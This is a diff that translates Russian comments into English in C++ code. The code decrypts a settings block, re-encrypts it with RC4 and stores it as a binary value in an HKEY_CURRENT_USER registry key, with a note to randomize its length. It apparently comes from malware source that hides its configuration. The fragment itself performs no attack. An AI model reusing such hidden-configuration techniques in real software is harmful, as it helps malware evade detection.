@@ -45,7 +45,7 @@ void LocalSettings::getCurrent(SETTINGS *settings)
     {
       Mem::_copy(settings, data, sizeof(SETTINGS));
 
-      //Снимаем шифрование.
+      //Remove encryption.
       {
         PESETTINGS pes;
         Core::getPeSettings(&pes);
@@ -78,15 +78,15 @@ bool LocalSettings::endReadWrite(SETTINGS *settings)
   bool r = false;
   if(settings != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)  
   {
-    //Шифруем.
+    //Encrypt.
     {
       PESETTINGS pes;
       Core::getPeSettings(&pes);
       Crypt::_rc4(settings, sizeof(SETTINGS), &pes.rc4Key);
     }
     
-    //Сохраняем.
-    //FIXME: Рандомизировать длину.
+    //Save.
+    //FIXME: randomize length.
     r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, settings, sizeof(SETTINGS));
   }
   Sync::_freeMutex(lastReadWriteMutex);
